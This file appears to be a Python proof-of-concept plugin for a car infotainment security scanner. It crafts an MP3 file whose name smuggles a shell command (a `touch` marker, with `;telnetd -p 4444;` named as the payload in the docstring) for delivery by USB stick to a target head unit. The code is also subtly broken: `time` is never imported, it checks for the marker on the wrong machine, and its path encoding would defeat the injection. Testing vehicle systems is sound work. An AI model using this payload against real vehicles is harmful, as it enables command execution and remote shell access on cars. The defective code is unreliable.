#!/usr/bin/env python3
"""
PoC Name: Filename Command Injection
Identifier: CWE-78
Component: Application Stack
Category: Application
Severity: High
CVSS: 7.5
Description: 恶意文件名Shell注入(;telnetd -p 4444;)
Prerequisites: 攻击机能够在本地生成文件。生成后须手动拷贝至 U盘 并插入车机触发扫描。
Usage: python3 07_CWE_78_Command_Injection_Active_Validation.py
"""
from __future__ import annotations

import sys
import os
from iv_plugin_base import IVIVulnerabilityPlugin

VULN = {
    "id":             0,
    "cve":            "CWE-78",
    "year":           78,
    "domain":         "application",
    "vendor_product": "Unknown",
    "component":      "Unknown",
    "type":           "Unknown",
    "summary":        "Filename Command Injection",
    "source_url":     "https://cwe.mitre.org/data/definitions/78.html",
    "affected":       [{"vendor": "Unknown", "product": "Unknown", "versions": []}],
    "references":     ["https://cwe.mitre.org/data/definitions/78.html"],
    "signature_tokens": ["CWE-78"],
}


def _run_poc(plugin, vuln=None) -> dict:
    """
    CWE-78 主动探针包装（兼容旧式 exploit() 实现）。
    通过调用插件自身的 exploit 逻辑并将结果标准化为 detection_confidence 格式。
    """
    try:
        result = plugin.exploit() or {}
    except Exception as exc:
        result = {"error": str(exc)}

    vulnerable = result.get("vulnerable", None)
    evidence = {
        "cve":       vuln.get("cve", "CWE-78") if vuln else "CWE-78",
        "target":    getattr(plugin, "target_ip", "unknown"),
        "technique": "legacy exploit() wrapper",
        "raw":       str(result)[:300],
    }

    # 根据是否有主动网络调用推断等级
    level = "B" if vulnerable is True else ("C" if vulnerable is False else "D")
    try:
        from probe_utils import detection_confidence as _detection_confidence
        return _detection_confidence(level, evidence, vulnerable=vulnerable)
    except ImportError:
        return {
            "detection_confidence": {
                "level": level, "vulnerable": vulnerable,
                "evidence": evidence, "method": "legacy_wrapper",
            }
        }


class FilenameCmdInjectPlugin(IVIVulnerabilityPlugin):
    meta_display_id = "POC-APP-007"
    meta_poc_name = 'CWE-78 命令注入 Active Validation'
    meta_cve_id = "CWE-78"
    meta_source_url = "https://cwe.mitre.org/data/definitions/78.html"
    meta_references = ['https://cwe.mitre.org/data/definitions/78.html']
    meta_severity = "High"
    meta_protocol = "unknown"
    meta_target_os = ["all"]
    meta_required_params = []
    meta_profiles         = ["application"]
    is_disruptive = False
    meta_destructive_level = "Safe"

    def check_prerequisites(self):
        self.marker_path = self.params.get("marker_path", "/tmp/pwned_usb")
        self.observe_seconds = float(self.params.get("observe_seconds", 5))
        return True

    def exploit(self):
        self.logger.info("准备生成多媒体文件名命令注入 Payload...")
        
        # 定义恶意的文件名
        # 很多早期的 IVI 直接把文件名放进 os.system("ffmpeg -i '" + filename + "' ...")
        # 如果文件名包含单引号闭合和反引号/分号，就会造成代码执行
        
        # payload 将在车载系统上执行：创建 /tmp/pwned_by_usb 标志文件或反弹 Shell
        shell_marker = self.marker_path.replace("/", "\\x2f")
        malicious_filename = f"track01'; touch {shell_marker}; echo 'pwned.mp3"
        safe_display_name = "track01_inject.mp3"
        
        payload_dir = "/tmp/ivi_usb_payloads"
        os.makedirs(payload_dir, exist_ok=True)
        
        full_path = ""
        
        try:
            # Python 中可以直接用包含了这些怪异字符的字符串创建文件
            # 为了防止在测试机自己搞出混乱，我们会在 payload_dir 下创建
            full_path = os.path.join(payload_dir, malicious_filename)
            
            self.logger.info(f"正在 {payload_dir} 构造物理文件...")
            
            # 写入一个合法的极简 MP3 头或者只是个空文件，系统只要扫文件名就会中招
            with open(full_path, "wb") as f:
                f.write(b"ID3\\x03\\x00\\x00\\x00\\x00\\x00\\x0a") # 假装是个 MP3
                f.write(b"MALICIOUS_CONTENT_HERE")
                
            self.logger.warning(f"[SUCCESS] 恶意媒体文件已在本地生成！")
            self.logger.warning(f"  绝对路径: {full_path}")
            self.logger.warning("[!] 请将此文件拷贝到物理U盘根目录，并插入到目标车机。")
            self.logger.warning(f"[!] 如果车机会自动索引音乐，此文件名将在解析时触发 Shell 命令：touch {self.marker_path}")
            time.sleep(self.observe_seconds)
            if os.path.exists(self.marker_path):
                return {
                    "status": "success",
                    "vulnerable": True,
                    "details": f"Observed injected marker file at {self.marker_path} after malicious filename processing."
                }
            
            return {
                "status": "success",
                "vulnerable": False,
                "details": f"已生成恶意文件名样本 {full_path}，但未在 {self.marker_path} 观察到自动化命令执行证据。"
            }
            
        except Exception as e:
            self.logger.error(f"创建畸形文件名失败 (OS 可能不允许某些字符限制): {e}")
            return {"status": "error", "details": str(e)}

if __name__ == "__main__":
    plugin = FilenameCmdInjectPlugin({})
    plugin.run_verify()
